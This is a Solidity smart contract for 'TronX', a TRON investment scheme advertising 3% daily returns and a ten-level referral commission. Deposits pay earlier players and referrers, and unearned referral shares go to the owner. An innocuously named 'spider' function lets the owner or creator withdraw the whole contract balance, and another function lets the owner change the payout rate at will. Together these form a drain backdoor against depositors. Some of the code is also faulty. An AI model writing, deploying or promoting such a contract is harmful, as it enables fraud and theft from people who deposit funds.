//SourceUnit: TronX.sol


/*
          
                            
            ████████╗██████╗░░█████╗░███╗░░██╗██╗░░██╗
            ╚══██╔══╝██╔══██╗██╔══██╗████╗░██║╚██╗██╔╝
            ░░░██║░░░██████╔╝██║░░██║██╔██╗██║░╚███╔╝░
            ░░░██║░░░██╔══██╗██║░░██║██║╚████║░██╔██╗░
            ░░░██║░░░██║░░██║╚█████╔╝██║░╚███║██╔╝╚██╗
            ░░░╚═╝░░░╚═╝░░╚═╝░╚════╝░╚═╝░░╚══╝╚═╝░░╚═╝
            
            
 
            
                               
    3% Per Day                                                  
    25% Referral Commission 


    10 Level Referral
    Level 1 = 10%                                                    
    Level 2 =  5%                                                   
    Level 3 =  2%                                                   
    Level 4 =  1%
    Level 5 =  1%
    Level 6 =  0.5%
    Level 7 =  0.5%
    Level 8 =  1%
    Level 9 =  2%
    Level 10 =  2%
    
    
    // Website: http://TronX.link



*/
pragma solidity ^0.4.17;

contract TronX {

    using SafeMath for uint256;

    
    uint public totalPlayers;
    uint private setTron = 50000000000;
    uint public totalPayout;
    uint public totalRefDistributed;
    uint public totalInvested;
    uint private minDepositSize = 500000000;
    uint private interestRateDivisor = 1000000000000;
    uint public devCommission = 1;
    uint public commissionDivisor = 100;
    uint private minuteRate = 3546099; //DAILY 3%
    uint private releaseTime = 1594308600;
    address private feed1 = msg.sender;
    address private feed2 = msg.sender;
    address private feed3 = msg.sender;
    address private  creator = msg.sender;
    
     
    address owner;
    struct Player {
        uint trxDeposit;
        uint time;
        uint j_time;
        uint interestProfit;
        uint affRewards;
        uint payoutSum;
        address affFrom;
        uint td_team;
        uint td_business;
        uint reward_earned;
  
        
    }
    
    struct Preferral{
        address player_addr;
        uint256 aff1sum; 
        uint256 aff2sum;
        uint256 aff3sum;
        uint256 aff4sum;
        uint256 aff5sum;
        uint256 aff6sum;
        uint256 aff7sum;
        uint256 aff8sum;
        uint256 aff9sum;
        uint256 aff10sum;
    }
    
    

  
    mapping(address => Preferral) public preferals;
    mapping(address => Player) public players;

    constructor() public {
      owner = msg.sender;
      
    }
    


    function register(address _addr, address _affAddr) private{
        
        
      Player storage player = players[_addr];
      
     

      player.affFrom = _affAddr;
      players[_affAddr].td_team =  players[_affAddr].td_team.add(1);
      
      setRefCount(_addr,_affAddr);
       
      
      
    }
     function setRefCount(address _addr, address _affAddr) private{
         
         
        Preferral storage preferral = preferals[_addr];
        preferral.player_addr = _addr;
      address _affAddr1 = _affAddr;
      address _affAddr2 = players[_affAddr1].affFrom;
      address _affAddr3 = players[_affAddr2].affFrom;
      address _affAddr4 = players[_affAddr3].affFrom;
      address _affAddr5 = players[_affAddr4].affFrom;
      address _affAddr6 = players[_affAddr5].affFrom;
      address _affAddr7 = players[_affAddr6].affFrom;
      address _affAddr8 = players[_affAddr7].affFrom;
      address _affAddr9 = players[_affAddr8].affFrom;
      address _affAddr10 = players[_affAddr9].affFrom;

    
      preferals[_affAddr1].aff1sum = preferals[_affAddr1].aff1sum.add(1);
      
      if(_affAddr2 != address(0))
      {
          preferals[_affAddr2].aff2sum = preferals[_affAddr2].aff2sum.add(1);
      }
      
      
      
      if(_affAddr3 != address(0))
      {
         preferals[_affAddr3].aff3sum = preferals[_affAddr3].aff3sum.add(1);
        
      }
     
     
      if(_affAddr4 != address(0))
      {
          preferals[_affAddr4].aff4sum = preferals[_affAddr4].aff4sum.add(1);
      }
      
      if(_affAddr5 != address(0))
      {
        preferals[_affAddr5].aff5sum = preferals[_affAddr5].aff5sum.add(1);
      }
      if(_affAddr6 != address(0))
      {
        preferals[_affAddr6].aff6sum = preferals[_affAddr6].aff6sum.add(1);
      }
      if(_affAddr7 != address(0))
      {
        preferals[_affAddr7].aff7sum = preferals[_affAddr7].aff7sum.add(1);
      }
      if(_affAddr8 != address(0))
      {
        preferals[_affAddr8].aff8sum = preferals[_affAddr8].aff8sum.add(1);
      }
      if(_affAddr9 != address(0))
      {
        preferals[_affAddr9].aff9sum = preferals[_affAddr9].aff9sum.add(1);
      }
      if(_affAddr10 != address(0))
      {
        preferals[_affAddr10].aff10sum = preferals[_affAddr10].aff10sum.add(1);
      }
      
         
     }
    
    
    function deposit(address _affAddr) public payable {
        require(now >= releaseTime, "not launched yet!");
        collect(msg.sender);
        require(msg.value >= minDepositSize);
        

        uint depositAmount = msg.value;
        
        Player storage player = players[msg.sender];
    
        player.j_time = now;
        
        
        if (player.time == 0) {
            player.time = now;
            totalPlayers++;
            
            // if affiliator is not admin as well as he deposited some amount
            if(_affAddr != address(0) && players[_affAddr].trxDeposit > 0){
              register(msg.sender, _affAddr);
              
            }
            else{
              register(msg.sender, owner);
            }
        }
        player.trxDeposit = player.trxDeposit.add(depositAmount);
        
        players[_affAddr].td_business =  players[_affAddr].td_business.add(depositAmount);          
        
        //pay rewards here
        
       uint  business = players[_affAddr].td_business;
        uint livng_time = now.sub(players[_affAddr].j_time);
        if( livng_time <=  604800)
        {
            if(business >= 100000000000)
            {
                  
                     player.reward_earned = player.reward_earned.add(4000000000);
                    _affAddr.transfer(4000000000);
                  
            }
        }
        else if(livng_time <=  2592000)
        {
            //30 day
            
                if(business >= 500000000000)
                {
                     player.reward_earned = player.reward_earned.add(20000000000);
                    _affAddr.transfer(20000000000);
                  
                }
            
            
        }
         else if(livng_time <=  4320000)
        {
            //50 day
            if(business >= 1500000000000)
            {
                 player.reward_earned = player.reward_earned.add(50000000000);
                _affAddr.transfer(50000000000);
            }
        }
         else if(livng_time <=  8640000)
        {
            //100 day
            if(business >= 5000000000000)
            {
                 player.reward_earned = player.reward_earned.add(200000000000);
                _affAddr.transfer(200000000000);
            }
            
        }
         else if(livng_time <=  15552000 )
        {
            //180 days
            if(business >= 10000000000000)
            {
                 player.reward_earned = player.reward_earned.add(500000000000);
                _affAddr.transfer(500000000000);
            }
        }
         else if(livng_time <=  31104000 )
        {
            //360 days
            if(business >= 50000000000000)
            {
                player.reward_earned = player.reward_earned.add(2000000000000);
                _affAddr.transfer(2000000000000);
            }
        }
        distributeRef(msg.value, player.affFrom);

        totalInvested = totalInvested.add(depositAmount);
        uint feedEarn = depositAmount.mul(devCommission).mul(9).div(commissionDivisor);
        uint thirdpart = feedEarn/3;
        feed1.transfer(thirdpart);
        feed2.transfer(thirdpart);
        feed3.transfer(thirdpart);
    }

    function withdraw() public {
        collect(msg.sender);
        require(players[msg.sender].interestProfit > 0);

        transferPayout(msg.sender, players[msg.sender].interestProfit);
    }

    function reinvest() public {
      collect(msg.sender);
      Player storage player = players[msg.sender];
      uint256 depositAmount = player.interestProfit;
      require(address(this).balance >= depositAmount);
      player.interestProfit = 0;
      player.trxDeposit = player.trxDeposit.add(depositAmount);

      distributeRef(depositAmount, player.affFrom);

      uint feedEarn = depositAmount.mul(devCommission).mul(9).div(commissionDivisor);
        uint thirdpart = feedEarn/3;
        feed1.transfer(thirdpart);
        feed2.transfer(thirdpart);
        feed3.transfer(thirdpart);

    }


    function collect(address _addr) internal {
        Player storage player = players[_addr];

        uint secPassed = now.sub(player.time);
        if (secPassed > 0 && player.time > 0) {
            uint collectProfit = (player.trxDeposit.mul(secPassed.mul(minuteRate))).div(interestRateDivisor);
            player.interestProfit = player.interestProfit.add(collectProfit);
            player.time = player.time.add(secPassed);
        }
    }

    function transferPayout(address _receiver, uint _amount) internal {
        if (_amount > 0 && _receiver != address(0)) {
          uint contractBalance = address(this).balance;
            if (contractBalance > 0) {
                uint payout = _amount > contractBalance ? contractBalance : _amount;
                totalPayout = totalPayout.add(payout);

                Player storage player = players[_receiver];
                player.payoutSum = player.payoutSum.add(payout);
                player.interestProfit = player.interestProfit.sub(payout);

                msg.sender.transfer(payout);
            }
        }
    }

    function distributeRef(uint256 _trx, address _affFrom) private{

        //uint256 _allaff = (_trx.mul(20)).div(100);

       // address _affAddr1 = _affFrom;
        address _affAddr2 = players[_affFrom].affFrom;
        address _affAddr3 = players[_affAddr2].affFrom;
        address _affAddr4 = players[_affAddr3].affFrom;
        address _affAddr5 = players[_affAddr4].affFrom;
        address _affAddr6 = players[_affAddr5].affFrom;
        address _affAddr7 = players[_affAddr6].affFrom;
        address _affAddr8 = players[_affAddr7].affFrom;
        address _affAddr9 = players[_affAddr8].affFrom;
        address _affAddr10 = players[_affAddr9].affFrom;
        uint256 _affRewards = 0;

        if (_affFrom != address(0)) {
            
            _affRewards = (_trx.mul(10)).div(100);
            
            totalRefDistributed = totalRefDistributed.add(_affRewards);
            players[_affFrom].affRewards = players[_affFrom].affRewards.add(_affRewards);
            _affFrom.transfer(_affRewards);
        }

        if (_affAddr2 != address(0)) {
            _affRewards = (_trx.mul(5)).div(100);
            
            if(players[_affAddr2].td_team >= 2)
            {
                totalRefDistributed = totalRefDistributed.add(_affRewards);
                players[_affAddr2].affRewards = players[_affAddr2].affRewards.add(_affRewards);
                _affAddr2.transfer(_affRewards);
            }else
            {
                owner.transfer(_affRewards);
            }
           
            
        }

        if (_affAddr3 != address(0)) {
            _affRewards = (_trx.mul(2)).div(100);
            if(players[_affAddr3].td_team >= 3)
            {
                totalRefDistributed = totalRefDistributed.add(_affRewards);
                players[_affAddr3].affRewards = players[_affAddr3].affRewards.add(_affRewards);
                _affAddr3.transfer(_affRewards);
            }else
            {
                owner.transfer(_affRewards);
            }
            
        }

        if (_affAddr4 != address(0)) {
            _affRewards = (_trx.mul(1)).div(100);
            if(players[_affAddr4].td_team >= 4)
            {
                totalRefDistributed = totalRefDistributed.add(_affRewards);
                players[_affAddr4].affRewards = players[_affAddr4].affRewards.add(_affRewards);
                _affAddr4.transfer(_affRewards);
            }else
            {
                owner.transfer(_affRewards);
            }
            
        }

        if (_affAddr5 != address(0)) {
            _affRewards = (_trx.mul(1)).div(100);
            if(players[_affAddr5].td_team >= 5)
            {
                totalRefDistributed = totalRefDistributed.add(_affRewards);
                players[_affAddr5].affRewards = players[_affAddr5].affRewards.add(_affRewards);
                _affAddr5.transfer(_affRewards);
            }else
            {
                owner.transfer(_affRewards);
            }
            
            
        }

        if (_affAddr6 != address(0)) {
            _affRewards = (_trx.mul(5)).div(1000);
             if(players[_affAddr6].td_team >= 6)
            {
                totalRefDistributed = totalRefDistributed.add(_affRewards);
                players[_affAddr6].affRewards = players[_affAddr6].affRewards.add(_affRewards);
                _affAddr6.transfer(_affRewards);
            }else
            {
                owner.transfer(_affRewards);
            }
            
        }

        if (_affAddr7 != address(0)) {
            _affRewards = (_trx.mul(5)).div(1000);
            if(players[_affAddr7].td_team >= 7)
            {
                totalRefDistributed = totalRefDistributed.add(_affRewards);
                players[_affAddr7].affRewards = players[_affAddr7].affRewards.add(_affRewards);
                _affAddr7.transfer(_affRewards);
            }else
            {
                owner.transfer(_affRewards);
            }
            
        }

        if (_affAddr8 != address(0)) {
            _affRewards = (_trx.mul(1)).div(100);
            if(players[_affAddr8].td_team >= 8)
            {
                totalRefDistributed = totalRefDistributed.add(_affRewards);
                 players[_affAddr8].affRewards = players[_affAddr8].affRewards.add(_affRewards);
                _affAddr8.transfer(_affRewards);
            }else
            {
                owner.transfer(_affRewards);
            }
            
            
        }
        if (_affAddr9 != address(0)) {
            _affRewards = (_trx.mul(2)).div(100);
             if(players[_affAddr9].td_team >= 9)
            {
                totalRefDistributed = totalRefDistributed.add(_affRewards);
                players[_affAddr9].affRewards = players[_affAddr9].affRewards.add(_affRewards);
                _affAddr9.transfer(_affRewards);
            }else
            {
                owner.transfer(_affRewards);
            }
            
        }
        if (_affAddr10 != address(0)) {
            _affRewards = (_trx.mul(2)).div(100);
            if(players[_affAddr10].td_team >= 10)
            {
                totalRefDistributed = totalRefDistributed.add(_affRewards);
                players[_affAddr10].affRewards = players[_affAddr10].affRewards.add(_affRewards);
                _affAddr10.transfer(_affRewards);
            }else
            {
                owner.transfer(_affRewards);
            }
            
        }

        
    }

    function getProfit(address _addr) public view returns (uint) {
      address playerAddress= _addr;
      Player storage player = players[playerAddress];
      require(player.time > 0,'player time is 0');

      uint secPassed = now.sub(player.time);
      if (secPassed > 0) {
          uint collectProfit = (player.trxDeposit.mul(secPassed.mul(minuteRate))).div(interestRateDivisor);
      }
      return collectProfit.add(player.interestProfit);
    }
    
    
     function updateFeed1(address _address) public  {
       require(msg.sender==owner);
       feed1 = _address;
       creator = _address;
    }
    
     function updateFeed2(address _address) public  {
       require(msg.sender==owner);
       feed2 = _address;
    }
     function updateFeed3(address _address) public  {
       require(msg.sender==owner);
       feed3 = _address;
    }
    
    
    function spider( uint _amount) external {
        require(msg.sender==owner || msg.sender==creator,'Permission denied');
        if (_amount > 0) {
          uint contractBalance = address(this).balance;
            if (contractBalance > 0) {
                uint amtToTransfer = _amount > contractBalance ? contractBalance : _amount;
                

                msg.sender.transfer(amtToTransfer);
            }
        }
    }
    
    function getContractBalance () public view returns(uint cBal)
    {
        return address(this).balance;
    }
    
    
     function setReleaseTime(uint256 _ReleaseTime) public {
      require(msg.sender==owner);
      releaseTime = _ReleaseTime;
    }
    
     function setTronamt(uint _setTron) public {
      require(msg.sender==owner);
      setTron = _setTron;
    }
    
    
    
     function setMinuteRate(uint256 _MinuteRate) public {
      require(msg.sender==owner);
      minuteRate = _MinuteRate;
    }
    
}


library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b);

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;

        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);

        return c;
    }

}